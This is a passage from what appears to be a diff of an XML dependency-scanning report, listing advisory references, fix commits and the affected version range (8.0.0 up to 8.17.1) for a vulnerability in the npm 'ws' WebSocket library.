+[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
+[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount
+</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/issues/2230</url><name>https://github.com/websockets/ws/issues/2230</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</url><name>https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/pull/2231</url><name>https://github.com/websockets/ws/pull/2231</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</url><name>https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</url><name>https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</url><name>https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:ws:\&gt;\=8.0.0\&lt;8.17.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency></dependencies></analysis>
